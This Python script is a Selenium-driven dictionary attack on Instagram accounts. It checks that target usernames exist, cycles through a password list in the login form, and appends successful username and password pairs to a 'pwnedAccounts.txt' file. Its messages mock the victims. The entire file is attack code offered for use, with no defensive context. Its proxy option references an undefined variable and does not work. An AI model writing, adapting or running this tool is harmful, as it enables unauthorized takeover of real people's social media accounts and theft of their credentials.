from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import optparse
import yaml

def userExists(driver, username):
    try:
        driver.get("https://instagram.com/" + username)
        assert ("Page Not Found" not in driver.title)
    except AssertionError:
        print('User: "%s" does not exist, trying with the next!' % username)
        return 1
    except Exception as e:
        print('Unknown error:', e)

def login(driver, user, password, delay):
    try:
        print('Trying with password: ' + password)
        elem = driver.find_element_by_name("username")
        elem.clear()
        elem.send_keys(user)
        elem = driver.find_element_by_name("password")
        elem.clear()
        elem.send_keys(password)
        elem.send_keys(Keys.RETURN)
        delay_seconds = float(delay)
        driver.implicitly_wait(delay_seconds)
        assert "Login" in driver.title
    except AssertionError:
        print('Access granted mother kaker!!')
        print('The password is: ' + password)
        try:
            with open('pwnedAccounts.txt', 'a') as f:
                f.write('username:' + user + '\npassword:' + password + '\n')
        except Exception as e:
            with open('pwnedAccounts.txt', 'w') as f:
                f.write('username:' + user + '\npassword:' + password + '\n')
        driver.delete_all_cookies()
        return 1
    except Exception as e:
        print("\rCheck your connection to the internet mother kaker")
        print(e)

def dictionaryAttack(driver, usernames, passwords, delay):
    if isinstance(usernames, list):
        for username in usernames:
            if userExists(driver, username) == 1:
                continue
            driver.get("https://instagram.com/accounts/login/")
            print('Trying with username: ' + username)
            for password in passwords:
                if login(driver, username, password, delay) == 1:
                    break
    else:
        if userExists(driver, usernames) == 1:
            return
        driver.get("https://instagram.com/accounts/login/")
        print('Trying with username: ' + usernames)
        for password in passwords:
            if login(driver, usernames, password, delay) == 1:
                break

def main():
    parser = optparse.OptionParser()
    parser.add_option('-f', '--file', action="store", dest="userfile", help="File containing valid usernames (one per line)", default=False)
    parser.add_option('-d', '--dictionary', action="store", dest="dictionary", help="File containing passwords", default=False)
    parser.add_option('-u', '--username', action="store", dest="username", help="A valid username", default=False)
    parser.add_option('-t', '--time', action="store", dest="delay", help="Delay in seconds. Use this option based on your connection speed", default=2)
    parser.add_option('-p', '--proxy', action='store_true', default=False)
    options, args = parser.parse_args()

    if options.delay is None:
        delay = 2
    else:
        delay = float(options.delay)

    print('Using %f seconds of delay' % delay)

    if not options.userfile and not options.username:
        print('You have to set an username or a userfile')
        exit()
    if options.userfile and options.username:
        print('You can\'t set both options at once. Choose between username or userfile')
        exit()
    if not options.dictionary:
        print('You have to set a valid path for the passwords dictionary')
        exit()

    driver = None

    if options.proxy:
        with open('proxy.yaml', 'r') as f:
            config = next(iter(yaml.load(f).values()))
            for k, v in config.items():
                getattr(profile, 'set_preference')(k, v)

    try:
        driver = webdriver.Chrome()  # Utilisation du pilote Chrome au lieu de Firefox
        driver.implicitly_wait(30)
        with open(options.dictionary, 'r') as f:
            passwords = [line.strip() for line in f]
        if options.userfile:
            with open(options.userfile, 'r') as f:
                usernames = [line.strip() for line in f]
            dictionaryAttack(driver, usernames, passwords, delay)
        else:
            dictionaryAttack(driver, options.username, passwords, delay)
    except Exception as e:
        print('An error occurred:', e)
    finally:
        if driver:
            driver.quit()

if __name__ == '__main__':
    main()
